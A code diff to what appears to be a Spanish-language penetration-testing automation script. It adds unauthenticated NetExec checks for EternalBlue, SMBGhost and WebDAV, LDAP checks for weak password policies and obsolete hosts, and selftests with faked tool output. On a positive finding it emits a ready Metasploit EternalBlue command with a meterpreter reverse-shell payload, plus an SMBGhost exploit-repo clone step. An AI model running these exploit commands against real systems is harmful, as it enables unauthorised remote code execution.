@@ -2564,6 +2564,58 @@ def fp_smb(ip, ports, services, host, deep):
                 su = spider_user or ""
                 _nxc_spider(res, nxc, ip, ["-u", su, "-p", ""], f"-u {shlex.quote(su)} -p ''",
                             shares, SPIDER_PATTERN)
+        # ms17-010 (EternalBlue, CVE-2017-0143/0144/...)/smbghost (CVE-2020-0796)/webdav: CUALQUIER
+        # host SMB (Windows suelto o DC, a diferencia de Zerologon que es SOLO de un DC) — por eso
+        # van FUERA del "if is_domain_controller" de abajo. SIN credenciales (igual que Zerologon:
+        # son sondeos de solo lectura, nxc no explota nada). Formato de salida confirmado en el
+        # código fuente real de nxc (nxc/modules/ms17-010.py, smbghost.py, webdav.py — no adivinado):
+        #   · ms17-010: "is likely VULNERABLE to MS17-010!" (vulnerable) / DoublePulsar infectado
+        #     aparte: "Host is likely INFECTED with DoublePulsar!"; si no, "does NOT appear
+        #     vulnerable" o "Unable to detect" — ninguna de las dos comparte "VULNERABLE".
+        #   · smbghost: "Potentially vulnerable to SMBGhost (CVE-2020-0796)" si lo es; si no,
+        #     NO imprime nada (ni éxito ni fallo) — el check es un paquete SMB crudo por socket.
+        #   · webdav: "WebClient Service enabled on: <host>" si el pipe 'DAV RPC Service' existe en
+        #     IPC$ (indica el servicio WebClient activo) — vector de coacción NTLM alternativo al
+        #     spooler/EFSR (ver fp_msrpc): fuerza al equipo a autenticarse por HTTP en vez de SMB.
+        rc, out17 = run_capture([nxc, "smb", ip, "-u", "", "-p", "", "-M", "ms17-010"], timeout=60)
+        vuln17 = "VULNERABLE to MS17-010" in (out17 or "")
+        dpulsar = "INFECTED with DoublePulsar" in (out17 or "")
+        _step(res, f"{nxc} smb {ip} -u '' -p '' -M ms17-010", vuln17, out17,
+              note="CVE-2017-0143/0144/0145/0146/0147/0148 (EternalBlue): ¿es vulnerable a RCE sin autenticar? Comprobación de solo lectura, SIN credenciales")
+        if vuln17:
+            res["findings"].append(("critica",
+                "SMB: EternalBlue (MS17-010, CVSS 8.1-9.3 según variante) — VULNERABLE (comprobado, sin "
+                "credenciales): RCE como SYSTEM sin autenticar" + (" — y YA INFECTADO con DoublePulsar" if dpulsar else "")))
+            res["next"].append(
+                f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; "
+                "set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST TU_IP; run'   # confirmado "
+                "VULNERABLE arriba — paso MANUAL, RCE sin autenticar; revisa la arquitectura/build exacta "
+                "primero (el exploit varía por versión de Windows)")
+
+        rc, outgh = run_capture([nxc, "smb", ip, "-u", "", "-p", "", "-M", "smbghost"], timeout=30)
+        vulngh = "Potentially vulnerable to SMBGhost" in (outgh or "")
+        _step(res, f"{nxc} smb {ip} -u '' -p '' -M smbghost", vulngh, outgh,
+              note="CVE-2020-0796 (SMBGhost): ¿dialecto SMB 3.1.1 con compresión activada? Comprobación de solo lectura, SIN credenciales")
+        if vulngh:
+            res["findings"].append(("critica",
+                "SMB: SMBGhost (CVE-2020-0796, CVSS 10.0 — el máximo posible) — POTENCIALMENTE VULNERABLE "
+                "(dialecto 3.1.1 + compresión activada, comprobado sin credenciales): RCE sin autenticar "
+                "(wormable) o LPE local"))
+            res["next"].append(
+                "git clone https://github.com/ly4k/SMBGhost && python3 SMBGhost/scanner.py "
+                f"{ip}   # confirma antes de explotar — el repo también trae un PoC de LPE local "
+                "(checker.py) y notas del RCE (más inestable); paso MANUAL")
+
+        rc, outwd = run_capture([nxc, "smb", ip, "-u", "", "-p", "", "-M", "webdav"], timeout=30)
+        webdav_on = "WebClient Service enabled on" in (outwd or "")
+        _step(res, f"{nxc} smb {ip} -u '' -p '' -M webdav", webdav_on, outwd,
+              note="¿está el servicio WebClient (cliente WebDAV) activo? Vector de coacción NTLM alternativo "
+                   "al spooler/EFSR: fuerza al equipo a autenticarse por HTTP en vez de SMB")
+        if webdav_on:
+            res["findings"].append(("media",
+                "SMB: servicio WebClient (WebDAV) activo — superficie de coacción NTLM alternativa: "
+                "'coercer coerce' con un listener HTTP (no SMB) puede forzar al equipo a autenticarse "
+                "contra un servidor WebDAV propio, sin depender del spooler ni de MS-EFSR"))
         if is_domain_controller(services):
             # Zerologon (CVE-2020-1472): SIN credenciales, contra CUALQUIER DC (parcheado o
             # no — nxc hace la comprobación, no el exploit). Es de los primeros checks que
@@ -6618,6 +6670,41 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                             "confirmada(s) arriba: intenta pedir un TGT con la contraseña por defecto de cada una "
                             "(nombre de equipo en minúsculas, sin '$', recortado a 14 car.) — paso MANUAL, es una "
                             "contraseña adivinada (1 intento/cuenta), no se ejecuta solo")
+                # PSO/FGPP (Fine-Grained Password Policy): política de contraseñas POR GRUPO/USUARIO,
+                # que puede ser MÁS LAXA que la del dominio entero (--pass-pol de arriba) — p. ej. una
+                # cuenta de servicio con una FGPP sin complejidad aunque el dominio sí la exija. Ya no
+                # es un módulo ('-M pso' está retirado — "[REMOVED] This module moved to the core
+                # option --pso", confirmado en el código fuente real de nxc, nxc/modules/pso.py), es
+                # un flag nativo (nxc/protocols/ldap/proto_args.py: '--pso', store_true). Formato de
+                # salida confirmado en nxc/protocols/ldap.py (método pso()).
+                rc, psoout = _run_capture_retry([nxc, "ldap", ip] + A() + ["--pso"], timeout=90, quiet=True)
+                pso_objs = re.search(r"(\d+) PSO Objects? found", psoout or "")
+                _step(res, f"{nxc} ldap {ip} {shown_auth} --pso", bool(pso_objs), mask(psoout),
+                      note="políticas de contraseña granulares (FGPP): pueden ser más laxas que la del dominio para ciertos usuarios/grupos")
+                if pso_objs and int(pso_objs.group(1)) > 0:
+                    _add_once(res, "media",
+                              f"AD (cred {u}): {pso_objs.group(1)} política(s) de contraseña granular (FGPP/PSO) — "
+                              "revisa la salida cruda del paso '--pso': puede ser más laxa que la política del "
+                              "dominio para la cuenta/grupo al que se aplica",
+                              "PSO", seen)
+                # Hosts con un SO obsoleto (XP/Vista/7/8/8.1/Server 2003/2008/2012, sin parches desde
+                # hace años) — objetivo de movimiento lateral directo si alguno sigue vivo en la red.
+                # Formato de salida confirmado en el código fuente real de nxc (nxc/modules/
+                # obsolete.py): 'N Obsolete hosts...' + una línea 'host (ip) : SO [pwd-last-set:
+                # fecha]' por equipo, o 'No Obsolete Hosts Identified' si ninguno.
+                rc, obsout = _run_capture_retry([nxc, "ldap", ip] + A() + ["-M", "obsolete"], timeout=120, quiet=True)
+                # Sin anclar a ^/$: nxc antepone 'PROTO ip puerto host ' a cada línea — \S+ ya no
+                # puede cruzar ese prefijo (tiene espacios), así que localiza solo el hostname
+                # pegado al '(' sin necesidad de quitar el prefijo a mano (igual de fiable).
+                obs_hosts = re.findall(r"(\S+) \(([^)]+)\) : (.+?) \[pwd-last-set: [^\]]+\]", obsout or "")
+                _step(res, f"{nxc} ldap {ip} {shown_auth} -M obsolete", bool(obs_hosts), mask(obsout),
+                      note="equipos del dominio con un SO Windows obsoleto (XP/Vista/7/8/Server 2003-2012) — sin soporte ni parches desde hace años")
+                if obs_hosts:
+                    _add_once(res, "alta",
+                              f"AD (cred {u}): {len(obs_hosts)} equipo(s) con SO obsoleto: "
+                              + ", ".join(f"{h} ({os_})" for h, _ip, os_ in obs_hosts[:10])
+                              + (" …" if len(obs_hosts) > 10 else ""),
+                              "SO obsoleto", seen)
             # get-desc-users: contraseñas filtradas en el campo "description" de las cuentas
             # (fallo de higiene clásico en AD). fp_ldap ya lo ejecuta, pero SOLO tras un bind
             # anónimo — si el anónimo está deshabilitado (lo normal en un AD mínimamente
@@ -10018,6 +10105,45 @@ def selftest():
     assert not any("signing NO requerido" in t for _s, t in _sgres2["findings"])
     assert "_signing_disabled" not in _sgres2
 
+    # fp_smb: ms17-010 (EternalBlue)/smbghost/webdav — para CUALQUIER host SMB (no solo un DC, a
+    # diferencia de Zerologon), SIN credenciales. Salidas REALES confirmadas contra el código
+    # fuente de nxc (nxc/modules/ms17-010.py, smbghost.py, webdav.py — no adivinadas).
+    _real_nxcbin_v, _real_rc_v = nxc_bin, run_capture
+
+    def _fake_vuln_rc(cmd, timeout=None, **kw):
+        if "-M" in cmd and "ms17-010" in cmd:
+            return 0, "SMB 10.0.0.1 445 WIN7 [*] 10.0.0.1 is likely VULNERABLE to MS17-010! (Windows 7 Professional 7601 Service Pack 1)\n" \
+                      "SMB 10.0.0.1 445 WIN7 Host is likely INFECTED with DoublePulsar! - XOR Key: 0x0"
+        if "-M" in cmd and "smbghost" in cmd:
+            return 0, "SMB 10.0.0.1 445 WIN10 Potentially vulnerable to SMBGhost (CVE-2020-0796)"
+        if "-M" in cmd and "webdav" in cmd:
+            return 0, "SMB 10.0.0.1 445 WIN10 WebClient Service enabled on: 10.0.0.1"
+        return 0, "SMB 10.0.0.1 445 DC01 [*] Windows 10 (name:DC01) (domain:X) (signing:True) (SMBv1:None)"
+    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_vuln_rc
+    try:
+        _vres = fp_smb("10.0.0.1", [{"port": 445}], [{"port": 445, "name": "smb", "scripts": {}}], {}, False)
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"] = _real_nxcbin_v, _real_rc_v
+    assert any(s == "critica" and "EternalBlue" in t and "DoublePulsar" in t for s, t in _vres["findings"]), _vres["findings"]
+    assert any("ms17_010_eternalblue" in n for n in _vres["next"])
+    assert any(s == "critica" and "SMBGhost" in t for s, t in _vres["findings"]), _vres["findings"]
+    assert any("SMBGhost/scanner.py" in n for n in _vres["next"])
+    assert any(s == "media" and "WebClient" in t for s, t in _vres["findings"]), _vres["findings"]
+
+    # Host NO vulnerable a ninguno de los tres → ningún hallazgo falso positivo.
+    def _fake_novuln_rc(cmd, timeout=None, **kw):
+        if "-M" in cmd and "ms17-010" in cmd:
+            return 0, "SMB 10.0.0.1 445 DC01 [-] 10.0.0.1 does NOT appear vulnerable"
+        if "-M" in cmd and ("smbghost" in cmd or "webdav" in cmd):
+            return 0, "SMB 10.0.0.1 445 DC01 [*] Windows 10 (name:DC01) (domain:X) (signing:True) (SMBv1:None)"
+        return 0, "SMB 10.0.0.1 445 DC01 [*] Windows 10 (name:DC01) (domain:X) (signing:True) (SMBv1:None)"
+    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_novuln_rc
+    try:
+        _novres = fp_smb("10.0.0.1", [{"port": 445}], [{"port": 445, "name": "smb", "scripts": {}}], {}, False)
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"] = _real_nxcbin_v, _real_rc_v
+    assert not any("EternalBlue" in t or "SMBGhost" in t or "WebClient" in t for _s, t in _novres["findings"])
+
     # _parse_nxc_ldap_signing / _parse_nxc_ldap_cbt: banner de nxc ldap, formato real
     # confirmado contra el código fuente de nxc (print_host_info de nxc/protocols/ldap.py) —
     # el módulo '-M ldap-checker' que hacía esto está retirado ('[REMOVED]' en su propio
@@ -10222,6 +10348,53 @@ def selftest():
         globals()["run_capture"], globals()["certipy_bin"], globals()["have"] = _real_rc_ce, _real_certipy_ce, _real_have_ce
     assert any(s == "alta" and "MachineAccountQuota = 5" in t and "jon" in t for s, t in _ceres["findings"])
     assert any(s == "info" and "trust con 'otherforest.local'" in t and "cred jon" in t for s, t in _ceres["findings"])
+
+    # _creds_enum (ldap, autenticado): --pso (FGPP) y -M obsolete — salidas REALES confirmadas
+    # contra el código fuente de nxc (nxc/protocols/ldap.py método pso(); nxc/modules/obsolete.py).
+    def _fake_ce_pso_obs(cmd, timeout=None, quiet=False, **kw):
+        if cmd[0] == "ldapsearch":
+            return 0, _trust_ldif
+        if "-M" in cmd and "maq" in cmd:
+            return 0, "MachineAccountQuota: 5"
+        if "--pso" in cmd:
+            return 0, ("LDAP 10.0.0.1 389 DC01 1 PSO Objects found!\n"
+                       "LDAP 10.0.0.1 389 DC01 \n"
+                       "LDAP 10.0.0.1 389 DC01 Policy Name: svc-accounts-pso\n"
+                       "LDAP 10.0.0.1 389 DC01 Minimum Password Length: 4\n"
+                       "LDAP 10.0.0.1 389 DC01 Complexity Enabled: FALSE")
+        if "-M" in cmd and "obsolete" in cmd:
+            return 0, ("LDAP 10.0.0.1 389 DC01 2 Obsolete hosts will be saved to /tmp/x.obsoletehosts.txt\n"
+                       "LDAP 10.0.0.1 389 DC01 FILESRV01.inlanefreight.local (10.0.0.20) : Windows Server 2008 R2 Standard [pwd-last-set: 2019-02-01 10:00:00]\n"
+                       "LDAP 10.0.0.1 389 DC01 OLDPC.inlanefreight.local (10.0.0.21) : Windows 7 Professional [pwd-last-set: 2020-05-12 08:30:00]")
+        return 0, "LDAP 10.0.0.1 389 DC01 [*] ok"
+    globals()["run_capture"] = _fake_ce_pso_obs
+    _ceres2 = _fp("reuse-ldap", "x", [389])
+    try:
+        _creds_enum(_ceres2, "FAKE_NXC", "ldap", "10.0.0.1", "jon", "Welcome1", False, False, True,
+                   389, 389, None, domain="inlanefreight.local")
+    finally:
+        globals()["run_capture"] = _real_rc_ce
+    assert any(s == "media" and "1 política(s)" in t and "FGPP/PSO" in t for s, t in _ceres2["findings"]), _ceres2["findings"]
+    assert any(s == "alta" and "2 equipo(s) con SO obsoleto" in t and "FILESRV01" in t and "OLDPC" in t
+               for s, t in _ceres2["findings"]), _ceres2["findings"]
+
+    # Sin PSOs ni hosts obsoletos → ningún hallazgo (ni falso positivo por "0 PSO Objects found").
+    def _fake_ce_clean(cmd, timeout=None, quiet=False, **kw):
+        if cmd[0] == "ldapsearch":
+            return 0, ""
+        if "--pso" in cmd:
+            return 0, "LDAP 10.0.0.1 389 DC01 [*] Attempting to enumerate policies..."   # sin "N PSO Objects found"
+        if "-M" in cmd and "obsolete" in cmd:
+            return 0, "LDAP 10.0.0.1 389 DC01 No Obsolete Hosts Identified"
+        return 0, "LDAP 10.0.0.1 389 DC01 [*] ok"
+    globals()["run_capture"] = _fake_ce_clean
+    _ceres3 = _fp("reuse-ldap", "x", [389])
+    try:
+        _creds_enum(_ceres3, "FAKE_NXC", "ldap", "10.0.0.1", "jon", "Welcome1", False, False, True,
+                   389, 389, None, domain="inlanefreight.local")
+    finally:
+        globals()["run_capture"] = _real_rc_ce
+    assert not any("PSO" in t or "SO obsoleto" in t for _s, t in _ceres3["findings"])
 
     # _smb_ad_enum: con la MISMA salida real de arriba, --pass-pol ahora también sale como
     # hallazgo 'info' (antes solo se leía en commands.log salvo lockout None/0).
